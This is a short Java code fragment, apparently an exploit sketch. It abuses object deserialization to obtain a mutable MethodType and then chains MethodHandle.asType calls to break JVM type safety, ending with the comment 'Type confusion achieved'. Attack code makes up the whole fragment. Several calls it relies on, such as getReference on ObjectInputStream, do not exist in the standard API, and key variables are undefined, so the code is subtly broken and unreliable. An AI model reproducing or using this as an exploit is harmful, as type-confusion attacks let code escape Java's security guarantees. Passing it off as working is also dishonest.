// Serialize cyclic graph so ObjectInputStream.putField retains a reference
// to the temporary MethodType instance during transition
ObjectInputStream ois = new MyCyclicObjectInputStream(serializedData);
MethodType mutableMt = (MethodType) ois.getReference(tempOffset);

// Use the mutating type to coerce a MethodHandle through incompatible types
MethodHandle mh = MethodHandles.identity(String.class);
MethodHandle confused = mh.asType(mutableMt); // transitional coercion
MethodHandle finalHandle = confused.asType(targetType); // Type confusion achieved
